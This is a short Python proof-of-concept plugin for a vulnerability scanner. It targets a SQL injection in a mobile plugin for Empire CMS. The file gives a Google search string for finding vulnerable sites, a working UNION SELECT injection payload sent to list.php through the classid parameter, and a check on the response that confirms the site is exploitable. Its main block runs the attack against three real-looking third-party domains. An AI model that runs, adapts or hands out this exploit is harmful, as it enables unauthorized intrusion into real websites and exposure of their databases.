#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = laozhangyakk
#_PlugName_ = 帝国CMS某手机插件注入
#search key in google = inurl：/ikaimi/rolling/
import re
def assign(service, arg):
    if service == 'empire_cms':
        return True, arg
def audit(arg):
    payload = 'ikaimi/rolling/list.php?line=10&page=&classid=10)%20UNION%20ALL%20SELECT%20CONCAT(0x71786a7171,md5(123),0x716a6b6b71),NULL,NULL,NULL,NULL--%20'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and '202cb962ac59075b964b07152d234b70' in res:
        security_note(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('empire_cms', 'http://m.qujianshi.com/')[1])
    audit(assign('empire_cms', 'http://m.52tuishu.com/')[1])
    audit(assign('empire_cms', 'http://mp.yuleqin.37ws.com/')[1])